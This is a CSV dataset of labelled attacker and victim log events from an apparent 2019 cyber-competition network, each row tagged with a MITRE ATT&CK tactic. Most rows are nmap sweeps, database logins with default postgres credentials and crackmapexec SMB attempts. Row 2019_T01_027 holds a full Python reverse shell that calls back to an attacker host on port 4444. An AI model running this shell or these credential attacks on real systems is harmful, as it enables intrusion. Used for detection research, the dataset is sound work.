ID,Host,Host_Type,Event,Tactic,Technique
2019_T01_012,nationals-t1-vdi-kali02,Attacker,nmap -sn 10.0.1.0/24 -oG 1-hosts.txt,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_013,nationals-t1-vdi-kali01,Attacker,root 17817 1 1.3 00:00:00 0.1 13392 32656 pts/1 S 00:03 psql -h_10.0.2.100_-U_postgres_--password_postgres,Lateral Movement,Valid Accounts
2019_T01_014,nationals-t1-bank-core-01,Victim,"{""endtime"":""2019-11-23T01:43:49.078028Z"",""timestamp"":""2019-11-23T01:43:32.965160Z"",""bytes"":5407,""src_ip"":""10.0.254.201"",""src_mac"":""42:01:0A:00:02:01"",""src_port"":50026,""canceled"":1,""connection"":""10.0.2.100:5432"",""client_rtt"":10675,""client_rtt_packets"":4,""client_rtt_sum"":42702,""ack_packets_in"":7,""bytes_in"":2617,""data_packets_in"":8,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":16,""app"":""ssl"",""server_rtt"":52,""server_rtt_packets"":1,""server_rtt_sum"":52,""dest_ip"":""10.0.2.100"",""dest_mac"":""42:01:0A:00:02:64"",""dest_port"":5432,""ack_packets_out"":2,""bytes_out"":2790,""data_packets_out"":8,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":10,""tcp_status"":0,""time_taken"":16123543,""flow_id"":""817df2c7-14ec-41f2-b3c9-2731169ce8a5"",""protocol_stack"":""ip:tcp:postgres:ssl:unknown"",""initial_rtt"":936}",Lateral Movement,Valid Accounts
2019_T01_015,nationals-t1-vdi-kali06,Attacker,nmap -n 10.0.2.0/24 -T5 -oA pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_016,nationals-t1-vdi-kali02,Attacker,root 30283 0 0.1 00:00:00 0.0 7012 53748 pts/0 S 00:09 nmap -sn_10.0.2.0/24_-oG_2-hosts.txt,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_017,nationals-t1-vdi-kali02,Attacker,nmap -sn 10.0.2.0/24 -oG 2-hosts.txt &,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_018,nationals-t1-vdi-kali01,Attacker,root 19197 1 1.2 00:00:00 0.1 13188 32672 pts/1 S 00:04 psql -h_10.0.2.100_-U_postgres,Lateral Movement,Valid Accounts
2019_T01_019,nationals-t1-bank-core-01,Victim,"{""endtime"":""2019-11-23T02:13:24.274752Z"",""timestamp"":""2019-11-23T02:13:24.263838Z"",""bytes"":3922,""src_ip"":""10.0.254.201"",""src_mac"":""42:01:0A:00:02:01"",""src_port"":50374,""canceled"":1,""connection"":""10.0.2.100:5432"",""client_rtt"":447,""client_rtt_packets"":2,""client_rtt_sum"":894,""ack_packets_in"":4,""bytes_in"":1594,""data_packets_in"":6,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":12,""app"":""ssl"",""server_rtt"":31,""server_rtt_packets"":1,""server_rtt_sum"":31,""dest_ip"":""10.0.2.100"",""dest_mac"":""42:01:0A:00:02:64"",""dest_port"":5432,""ack_packets_out"":2,""bytes_out"":2328,""data_packets_out"":7,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":9,""tcp_status"":0,""time_taken"":11361,""flow_id"":""87e64f24-1d97-4339-9cf2-271ac86caceb"",""protocol_stack"":""ip:tcp:postgres:ssl:unknown"",""initial_rtt"":835}",Lateral Movement,Valid Accounts
2019_T01_020,nationals-t1-vdi-kali06,Attacker,nmap -n 10.0.2.0/24 -T5 -oA pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_021,nationals-t1-vdi-kali02,Attacker,root 30283 0 0.1 00:00:00 0.0 7012 53748 pts/0 S 00:09 nmap -sn_10.0.2.0/24_-oG_2-hosts.txt,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_022,nationals-t1-vdi-kali01,Attacker,root 22092 0 0.0 00:00:00 0.1 13108 32672 pts/7 S 04:46 psql -h_10.0.2.100_-U_postgres,Lateral Movement,Valid Accounts
2019_T01_023,nationals-t1-bank-core-01,Victim,"{""endtime"":""2019-11-23T02:13:34.068736Z"",""timestamp"":""2019-11-23T02:13:27.657772Z"",""bytes"":4673,""src_ip"":""10.0.254.201"",""src_mac"":""42:01:0A:00:02:01"",""src_port"":50376,""connection"":""10.0.2.100:5432"",""client_rtt"":10387,""client_rtt_packets"":4,""client_rtt_sum"":41551,""ack_packets_in"":5,""bytes_in"":1645,""data_packets_in"":6,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":12,""app"":""ssl"",""server_rtt"":21,""server_rtt_packets"":1,""server_rtt_sum"":21,""dest_ip"":""10.0.2.100"",""dest_mac"":""42:01:0A:00:02:64"",""dest_port"":5432,""ack_packets_out"":2,""bytes_out"":3028,""data_packets_out"":7,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":9,""tcp_status"":0,""time_taken"":6421351,""flow_id"":""dd0775cb-d8f7-4840-bb9b-30dc1bbfb95e"",""protocol_stack"":""ip:tcp:postgres:ssl:unknown"",""initial_rtt"":278}",Lateral Movement,Valid Accounts
2019_T01_024,nationals-t1-vdi-kali01,Attacker,vim /tmp/k.sh,Pre-Attack,Pre-Attack
2019_T01_025,nationals-t1-vdi-kali01,Attacker,python -m SimpleHTTPServer 80,Collection,Automated Collection
2019_T01_026,nationals-t1-vdi-kali01,Attacker,root 27660 0 3.0 00:00:00 0.1 13740 26332 pts/2 S 00:01 python -m_SimpleHTTPServer_80,Collection,Automated Collection
2019_T01_027,nationals-t1-bank-core-01,Victim,"postgres 26363 1 0.1 00:00:00 0.1 9808 43464 ? S 00:07 python -c_import_socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.254.201"",4444));os.dup2(s.fileno(),0);_os.dup2(s.fileno(),1);_os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);",Privilege Escalation,Hijack Execution Flow
2019_T01_028,nationals-t1-vdi-kali06,Attacker,nmap -n 10.0.1.0/24 -T5 -oA pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_029,nationals-t1-vdi-kali02,Attacker,nmap -sn 10.0.1.0/24 -oG 1-hosts.txt,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_030,nationals-t1-vdi-kali01,Attacker,root 11165 1 1.0 00:00:00 0.0 7252 22376 pts/3 S 00:02 nmap 10.0.12.0/24_-T5_-sn_-oA_11.0_host,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_031,nationals-t1-vdi-kali01,Attacker,nmap 10.0.12.0/24 -T5 -sn -oA 11.0_host,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_032,nationals-t1-vdi-kali06,Attacker,root 16683 1 0.0 00:00:00 0.2 15372 32780 pts/0 S 00:00 nmap -n_10.0.10.0/24_-T5_-oA_pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_033,nationals-t1-vdi-kali06,Attacker,nmap -n 10.0.10.0/24 -T5 -oA pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_034,nationals-t1-vdi-kali04,Attacker,"{""endtime"":""2019-11-23T02:18:46.700770Z"",""timestamp"":""2019-11-23T02:18:46.690648Z"",""bytes"":659,""src_ip"":""10.0.254.204"",""src_mac"":""42:01:0A:00:FE:CC"",""src_port"":44122,""connection"":""10.0.10.209:3389"",""client_rtt"":14,""client_rtt_packets"":1,""client_rtt_sum"":14,""ack_packets_in"":3,""bytes_in"":380,""data_packets_in"":1,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":5,""app"":""rdp"",""server_rtt"":181,""server_rtt_packets"":1,""server_rtt_sum"":181,""refused"":1,""dest_ip"":""10.0.10.209"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":3389,""ack_packets_out"":3,""bytes_out"":279,""data_packets_out"":1,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":4,""tcp_status"":0,""time_taken"":10136,""flow_id"":""7d77659b-37aa-49d9-9fc2-b3e44e72d61f"",""protocol_stack"":""ip:tcp:cotp:mcs:rdp"",""initial_rtt"":96}",Lateral Movement,Valid Accounts
2019_T01_035,nationals-t1-gotham-gotham-wk-02,Victim,"AddressFamily=ipv4 AddressFamilyId=2 PacketType=transport PacketTypeId=2 Direction=inbound Protocol=TCP ProtocolId=6 LocalAddress=10.0.10.209 LocalPort=3389 RemoteHostName=kali04.vdi.dinobank.us RemoteAddress=10.0.254.204 RemotePort=44064 ProcessName=""unknown"" UserName=""unknown"" UserSid=unknown UserId=0-0 HeaderSizeBytes=20 IPsecProtected=0 TransportHeaderSizeBytes=32",Lateral Movement,Valid Accounts
2019_T01_036,nationals-t1-gotham-gotham-wk-02,Victim,"Process Information: New Process ID: 0x1680 New Process Name: C:\Windows\System32\notepad.exe Token Elevation Type: %%1936 Mandatory Label: Mandatory Label\High Mandatory Level Creator Process ID: 0xac Creator Process Name: C:\Windows\explorer.exe Process Command Line: ""C:\Windows\system32\NOTEPAD.EXE"" C:\pstrans\20191122\PowerShell_transcript.GOTHAM-WK-02.+4xxgO7X.20191122045648.txt",Credential Access,Credentials in Files
2019_T01_037,nationals-t1-vdi-kali06,Attacker,nmap -n 10.0.1.0/24 -T5 -oA pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_038,nationals-t1-vdi-kali02,Attacker,nmap -sn 10.0.1.0/24 -oG 1-hosts.txt,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_039,nationals-t1-vdi-win01,Attacker,"{""endtime"":""2019-11-23T14:28:46.406021Z"",""timestamp"":""2019-11-23T14:28:44.668156Z"",""bytes"":12455,""src_mac"":""42:01:0A:00:FE:65"",""src_port"":50846,""bytes_in"":1020,""dest_ip"":""10.0.1.31"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":11435,""time_taken"":1737865,""transport"":""tcp"",""flow_id"":""80ffe49b-4584-4f7b-9f7d-14cba01997c5"",""src_ip"":""10.0.254.101"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":10572,""http_content_type"":""text/html; charset=UTF-8"",""cookie"":""DinoBook_session=kqobng3vjav7qgg85ei2v4t85df1vuve; UseDC=master; UseCDNCache=false"",""form_data"":""wpName=Test&wpPassword=Password123!&retype=Password123!&email=&realname=&wpCreateaccount=Create your account&wpEditToken=+\\&title=Special:CreateAccount&authAction=create&force=&wpCreateaccountToken=71a9ace52bcef816c6f1e8af5a6a0da75dd941f1+\\"",""site"":""10.0.1.31"",""http_method"":""POST"",""http_referrer"":""http://10.0.1.31/index.php?title=Special:CreateAccount&returnto=Main+Page"",""server"":""Microsoft-IIS/10.0"",""status"":200,""uri_query"":""title=Special:CreateAccount&returnto=Main Page"",""uri_path"":""/index.php"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"",""protocol_stack"":""ip:tcp:http""}",Credential Access,Unsecured Credentials
2019_T01_040,nationals-t1-corp-corp-web-01,Victim,"{""endtime"":""2019-11-23T14:28:46.190084Z"",""timestamp"":""2019-11-23T14:28:44.452485Z"",""bytes"":12455,""src_mac"":""42:01:0A:00:01:01"",""src_port"":50846,""bytes_in"":1020,""dest_ip"":""10.0.1.31"",""dest_mac"":""42:01:0A:00:01:1F"",""dest_port"":80,""bytes_out"":11435,""time_taken"":1737599,""transport"":""tcp"",""flow_id"":""8c9cad4f-35eb-43f8-b301-e8b00e9ef679"",""src_ip"":""10.0.254.101"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":10572,""http_content_type"":""text/html; charset=UTF-8"",""cookie"":""DinoBook_session=kqobng3vjav7qgg85ei2v4t85df1vuve; UseDC=master; UseCDNCache=false"",""form_data"":""wpName=Test&wpPassword=Password123!&retype=Password123!&email=&realname=&wpCreateaccount=Create your account&wpEditToken=+\\&title=Special:CreateAccount&authAction=create&force=&wpCreateaccountToken=71a9ace52bcef816c6f1e8af5a6a0da75dd941f1+\\"",""site"":""10.0.1.31"",""http_method"":""POST"",""http_referrer"":""http://10.0.1.31/index.php?title=Special:CreateAccount&returnto=Main+Page"",""server"":""Microsoft-IIS/10.0"",""status"":200,""uri_query"":""title=Special:CreateAccount&returnto=Main Page"",""uri_path"":""/index.php"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"",""protocol_stack"":""ip:tcp:http""}",Credential Access,Unsecured Credentials
2019_T01_041,nationals-t1-vdi-kali01,Attacker,root 2117 0 4.0 00:00:00 0.0 7200 24416 pts/3 S 00:01 nmap 10.0.11.0/24_-T5_-sn_-oA_11.0_host,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_042,nationals-t1-vdi-kali01,Attacker,nmap 10.0.11.0/24 -T5 -sn -oA 11.0_host,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_043,nationals-t1-vdi-kali01,Attacker,root 11165 1 1.0 00:00:00 0.0 7252 22376 pts/3 S 00:02 nmap 10.0.12.0/24_-T5_-sn_-oA_11.0_host,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_044,nationals-t1-vdi-kali01,Attacker,nmap 10.0.12.0/24 -T5 -sn -oA 11.0_host,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_045,nationals-t1-vdi-kali06,Attacker,root 16683 1 0.0 00:00:00 0.2 15372 32780 pts/0 S 00:00 nmap -n_10.0.10.0/24_-T5_-oA_pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_046,nationals-t1-vdi-kali06,Attacker,nmap -n 10.0.10.0/24 -T5 -oA pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_047,nationals-t1-vdi-kali01,Attacker,root 11165 1 1.0 00:00:00 0.0 7252 22376 pts/3 S 00:02 nmap 10.0.12.0/24_-T5_-sn_-oA_11.0_host,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_048,nationals-t1-vdi-kali01,Attacker,nmap 10.0.12.0/24 -T5 -sn -oA 11.0_host,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_049,nationals-t1-vdi-kali06,Attacker,root 16683 1 0.0 00:00:00 0.2 15372 32780 pts/0 S 00:00 nmap -n_10.0.10.0/24_-T5_-oA_pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_050,nationals-t1-vdi-kali06,Attacker,nmap -n 10.0.10.0/24 -T5 -oA pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_051,nationals-t1-bank-core-01,Victim,postgres 23143 1 22.2 00:00:01 0.0 4048 21704 pts/0 D 00:07 find /_-name_miner.exe,Pre-Attack,Pre-Attack
2019_T01_052,nationals-t1-vdi-kali01,Attacker,root 11165 1 1.0 00:00:00 0.0 7252 22376 pts/3 S 00:02 nmap 10.0.12.0/24_-T5_-sn_-oA_11.0_host,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_053,nationals-t1-vdi-kali01,Attacker,nmap 10.0.12.0/24 -T5 -sn -oA 11.0_host,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_054,nationals-t1-vdi-kali06,Attacker,root 16683 1 0.0 00:00:00 0.2 15372 32780 pts/0 S 00:00 nmap -n_10.0.10.0/24_-T5_-oA_pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_055,nationals-t1-vdi-kali06,Attacker,nmap -n 10.0.10.0/24 -T5 -oA pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_056,nationals-t1-vdi-kali06,Attacker,nmap -n 10.0.2.0/24 -T5 -oA pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_057,nationals-t1-vdi-kali02,Attacker,root 30283 0 0.1 00:00:00 0.0 7012 53748 pts/0 S 00:09 nmap -sn_10.0.2.0/24_-oG_2-hosts.txt,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_058,nationals-t1-vdi-kali06,Attacker,nmap -n 10.0.1.0/24 -T5 -oA pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_059,nationals-t1-vdi-kali06,Attacker,nmap -n 10.0.2.0/24 -T5 -oA pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_060,nationals-t1-vdi-kali02,Attacker,root 30283 0 0.1 00:00:00 0.0 7012 53748 pts/0 S 00:09 nmap -sn_10.0.2.0/24_-oG_2-hosts.txt,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_061,nationals-t1-vdi-kali06,Attacker,nmap -n 10.0.1.0/24 -T5 -oA pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_062,nationals-t1-vdi-kali06,Attacker,nmap -n 10.0.1.0/24 -T5 -oA pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_063,nationals-t1-vdi-kali06,Attacker,nmap -n 10.0.2.0/24 -T5 -oA pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_064,nationals-t1-vdi-kali02,Attacker,root 30283 0 0.1 00:00:00 0.0 7012 53748 pts/0 S 00:09 nmap -sn_10.0.2.0/24_-oG_2-hosts.txt,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_065,nationals-t1-vdi-kali06,Attacker,root 16683 1 0.0 00:00:00 0.2 15372 32780 pts/0 S 00:00 nmap -n_10.0.10.0/24_-T5_-oA_pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_066,nationals-t1-vdi-kali06,Attacker,nmap -n 10.0.10.0/24 -T5 -oA pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_067,nationals-t1-vdi-kali04,Attacker,root 30096 0 49.0 00:00:00 0.6 50104 336060 pts/2 S 00:01 python /usr/local/bin/crackmapexec_smb_10.0.10.100_-u_Guest_-p_guest,Lateral Movement,Remote Services
2019_T01_068,nationals-t1-vdi-kali04,Attacker,crackmapexec smb 10.0.10.100 -u 'Guest' -p 'guest',Lateral Movement,Remote Services
2019_T01_069,nationals-t1-gotham-gotham-dc,Victim,"{""endtime"":""2019-11-23T13:53:11.230764Z"",""timestamp"":""2019-11-23T13:53:11.007311Z"",""bytes"":2520,""src_ip"":""10.0.254.204"",""src_mac"":""42:01:0A:00:0A:01"",""src_port"":42314,""connection"":""10.0.10.100:445"",""client_rtt"":679,""client_rtt_packets"":1,""client_rtt_sum"":679,""ack_packets_in"":2,""bytes_in"":1130,""data_packets_in"":5,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":8,""app"":""smb"",""server_rtt"":32536,""server_rtt_packets"":2,""server_rtt_sum"":65073,""refused"":1,""dest_ip"":""10.0.10.100"",""dest_mac"":""42:01:0A:00:0A:64"",""dest_port"":445,""ack_packets_out"":3,""bytes_out"":1390,""data_packets_out"":4,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":7,""tcp_status"":0,""time_taken"":224132,""flow_id"":""ac036908-7560-49fb-bf1f-27c4d0a1a69c"",""protocol_stack"":""ip:tcp:netbios:smb"",""initial_rtt"":802}",Lateral Movement,Remote Services
2019_T01_070,nationals-t1-vdi-kali06,Attacker,nmap -n 10.0.1.0/24 -T5 -oA pingscan,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T01_071,nationals-t1-vdi-kali04,Attacker,"{""endtime"":""2019-11-23T02:04:17.193170Z"",""timestamp"":""2019-11-23T02:04:17.193170Z"",""bytes"":18,""src_mac"":""42:01:0A:00:FE:CC"",""src_port"":49704,""bytes_in"":18,""dest_ip"":""10.0.1.250"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":40745,""bytes_out"":0,""time_taken"":33,""transport"":""tcp"",""flow_id"":""caa088f2-bc07-48e1-9a18-08cd50ea22d0"",""src_ip"":""10.0.254.204"",""http_method"":""GET"",""uri_path"":""/"",""protocol_stack"":""ip:tcp:http""}","Discovery, Collection",Manual Search for Sensitive Information in Webpages
2019_T01_072,nationals-t1-corp-coins-01,Victim,"{""endtime"":""2019-11-23T02:04:17.197089Z"",""timestamp"":""2019-11-23T02:04:17.197089Z"",""bytes"":22,""src_mac"":""42:01:0A:00:01:01"",""src_port"":49708,""bytes_in"":22,""dest_ip"":""10.0.1.250"",""dest_mac"":""42:01:0A:00:01:FA"",""dest_port"":40745,""bytes_out"":0,""time_taken"":79,""transport"":""tcp"",""flow_id"":""89882d7f-1300-47d1-872b-c569bf218ca2"",""src_ip"":""10.0.254.204"",""http_method"":""OPTIONS"",""uri_path"":""/ RTSP/1.0"",""protocol_stack"":""ip:tcp:http""}","Discovery, Collection",Manual Search for Sensitive Information in Webpages
2019_T01_073,nationals-t1-corp-coins-01,Victim,"{""endtime"":""2019-11-23T13:51:16.435510Z"",""timestamp"":""2019-11-23T13:51:16.395689Z"",""bytes"":2458,""src_ip"":""10.0.254.204"",""src_mac"":""42:01:0A:00:01:01"",""src_port"":49544,""connection"":""10.0.1.250:40745"",""client_rtt"":93,""client_rtt_packets"":2,""client_rtt_sum"":186,""ack_packets_in"":4,""bytes_in"":1379,""data_packets_in"":1,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":6,""app"":""ssl"",""server_rtt"":7,""server_rtt_packets"":1,""server_rtt_sum"":7,""dest_ip"":""10.0.1.250"",""dest_mac"":""42:01:0A:00:01:FA"",""dest_port"":40745,""ack_packets_out"":3,""bytes_out"":1079,""data_packets_out"":1,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":4,""ssl_client_hello_version"":""3.3"",""ssl_client_cipher_list"":[...],""ssl_client_cipher_names"":[...],""ssl_client_compression_methods"":[0],""ssl_cipher_id"":49199,""ssl_cipher_name"":""TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"",""ssl_compression_method"":0,""ssl_issuer"":""C = AU, ST = Some-State, O = Internet Widgits Pty Ltd"",""ssl_cert_md5"":""CBE63331BFB898BAB5B9A2FD5A1A8351"",""ssl_cert_sha1"":""756BED1768DCCA03485652C0E8CC85EA06E6177D"",""ssl_cert_sha256"":""87A3FEDE89EE03A7DB6A9CB854E09E4AE6AC68F22DB51F0222F94AB120921517"",""ssl_publickey_algorithm"":""rsaEncryption"",""ssl_publickey_bit_len"":1024,""ssl_cert_self_signed"":1,""ssl_serialnumber"":""9818684696581364650"",""ssl_signature_algorithm"":""sha256WithRSAEncryption"",""ssl_subject"":""C = AU, ST = Some-State, O = Internet Widgits Pty Ltd"",""ssl_validity_end"":""Dec 3 18:49:53 2018 GMT"",""ssl_validity_start"":""Dec 3 18:49:53 2017 GMT"",""ssl_session_id"":""BF324ED5FEED09E242574BE40999F4C727040D39F38E973DD33467FECA3C7379"",""ssl_version"":""3.3"",""tcp_status"":0,""time_taken"":39914,""flow_id"":""d83bf9f2-3caa-4a96-b631-b5759b29eb9c"",""protocol_stack"":""ip:tcp:ssl:unknown"",""initial_rtt"":113}","Discovery, Collection",Manual Search for Sensitive Information in Webpages
2019_T02_001,nationals-t2-vdi-kali01,Attacker,root 14585 1 0.0 00:00:00 0.0 7204 53748 pts/0 S 00:02 nmap -sP_-T4_-v_-oG_live_hosts_10.0.2.0/24,"Discovery, Collection","Network Service Scanning, Automated Collection"
2019_T02_002,nationals-t2-vdi-kali01,Attacker,nmap -sP -T4 -v -oG live_hosts 10.0.2.0/24,"Discovery, Collection","Network Service Scanning, Automated Collection"
